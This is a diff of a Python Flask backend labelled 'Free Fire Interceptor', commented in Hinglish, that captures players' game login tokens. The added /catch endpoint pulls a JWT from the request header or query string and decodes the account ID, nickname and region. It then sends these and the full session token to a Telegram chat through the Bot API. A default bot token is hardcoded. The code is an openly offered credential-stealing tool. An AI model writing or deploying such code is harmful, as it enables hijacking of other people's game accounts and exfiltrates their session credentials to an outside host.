@@ -1,49 +1,89 @@
-from flask import Flask, jsonify, request
+import os
+import base64
+import json
+import requests
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# Temporary memory storage (Production ke liye aap database ya JSON file use kar sakte hain)
-# Key: telegram_id, Value: captured token/payload data
-TOKEN_DATABASE = {}
+# Aapke Telegram bot ka token (Render par environment variable se uthayega)
+TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8956940192:AAGu8293e28HolwGE3yFt0m-Q8xKsOg6uo4")
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
-@app.route("/<telegram_id>/", methods=["GET", "POST", "PUT"])
-def handle_game_login(telegram_id):
-  try:
-    # 1. Game se aane wale data (JSON body, Form data, ya Headers) ko capture karna
-    req_data = request.get_json(silent=True) or request.form.to_dict()
-    req_headers = dict(request.headers)
-    req_args = request.args.to_dict()
+def decode_jwt_payload(token):
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return None
+        payload_encoded = parts[1]
+        payload_encoded += '=' * (-len(payload_encoded) % 4)
+        decoded_bytes = base64.urlsafe_b64decode(payload_encoded)
+        return json.loads(decoded_bytes.decode('utf-8'))
+    except Exception as e:
+        print(f"JWT Decode Error: {e}")
+        return None
 
-    # 2. Data ko database/memory mein store karna us Telegram ID ke against
-    TOKEN_DATABASE[telegram_id] = {
-        "query_params": req_args,
-        "json_body": req_data,
-        "headers": req_headers,
-    }
+@app.route('/catch', methods=['POST', 'GET'])
+def catch_request():
+    try:
+        # Game request ke header ya query param se token nikalna
+        auth_header = request.headers.get('Authorization') or request.args.get('auth')
+        chat_id = request.args.get('chat_id') # Jis Telegram user ko bhejna hai
 
-    print(f"[+] Token Captured for Telegram ID: {telegram_id}")
-    print(f"Data: {req_data}")
+        if not auth_header:
+            return jsonify({"status": "error", "message": "Authorization header missing!"}), 400
+        
+        if auth_header.startswith("Bearer "):
+            jwt_token = auth_header.split(" ")[1]
+        else:
+            jwt_token = auth_header
 
-    # 3. Game ko ek successful response bhejna taaki game ka login flow na ruke
-    return jsonify(
-        {"success": True, "message": "Session captured successfully"}
-    ), 200
+        # JWT decode karke data nikalna
+        jwt_data = decode_jwt_payload(jwt_token)
+        if not jwt_data:
+            return jsonify({"status": "error", "message": "Invalid JWT Token format!"}), 400
 
-  except Exception as e:
-    print(f"[-] Error: {str(e)}")
-    return jsonify({"success": False, "error": str(e)}), 500
+        account_id = jwt_data.get("account_id")
+        encoded_nickname = jwt_data.get("nickname")
+        region = jwt_data.get("lock_region")
+        open_id = jwt_data.get("external_id")
+        
+        try:
+            nickname = base64.b64decode(encoded_nickname).decode('utf-8') if encoded_nickname else "Unknown"
+        except:
+            nickname = encoded_nickname
 
+        # Agar chat_id available hai, toh Telegram par message bhej do
+        if chat_id:
+            msg_text = (
+                f"🔑 **ACCESS TOKEN CAPTURED SUCCESSFULLY!!**\n\n"
+                f"👤 **ACCOUNT ID:** `{account_id}`\n"
+                f"🎮 **PLAYER NAME:** `{nickname}`\n"
+                f"🌍 **REGION:** `{region}`\n"
+                f"🆔 **OPEN ID:** `{open_id}`\n\n"
+                f"🛡️ **JWT TOKEN:**\n`{jwt_token}`"
+            )
+            requests.post(TELEGRAM_API_URL, json={
+                "chat_id": chat_id,
+                "text": msg_text,
+                "parse_mode": "Markdown"
+            })
 
-# Telegram Bot ke liye endpoint jahan se bot token fetch karega
-@app.route("/get_token/<telegram_id>", methods=["GET"])
-def get_token(telegram_id):
-  if telegram_id in TOKEN_DATABASE:
-    data = TOKEN_DATABASE[telegram_id]
-    return jsonify({"exists": True, "data": data}), 200
-  else:
-    return jsonify({"exists": False, "message": "No token found"}), 404
+        return jsonify({
+            "status": "success",
+            "account_id": account_id,
+            "nickname": nickname,
+            "region": region
+        }), 200
 
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
-if __name__ == "__main__":
-  app.run(host="0.0.0.0", port=5000)
-  
+@app.route('/')
+def home():
+    return "Free Fire Interceptor Backend is Running!"
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
+    
